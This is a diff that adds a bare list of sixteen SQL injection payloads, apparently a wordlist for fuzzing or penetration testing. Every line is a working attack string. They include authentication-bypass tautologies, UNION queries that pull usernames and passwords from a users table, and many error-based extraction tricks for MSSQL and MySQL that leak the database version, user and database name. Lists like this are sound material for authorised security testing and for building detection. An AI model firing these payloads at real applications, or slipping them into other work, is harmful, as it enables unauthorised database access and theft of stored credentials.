@@ -1,0 +1,16 @@
+' OR '1'='1
+' AND '1'='1
+' UNION SELECT null, null--
+' UNION SELECT username, password FROM users--
+' UNION SELECT null, null, null--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user_name()))--
+' AND 1=CONVERT(int, (SELECT db_name()))--
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))--
+' AND UPDATEXML(1, CONCAT(0x7e, (SELECT @@version)), 1)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND EXP(~(SELECT * FROM (SELECT @@version)a))--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(@@version) FROM dual) USING utf8)))--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version)),1)--
+' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)--
+' AND polygonfrommysql((SELECT * FROM (SELECT * FROM (SELECT @@version)a)b))--
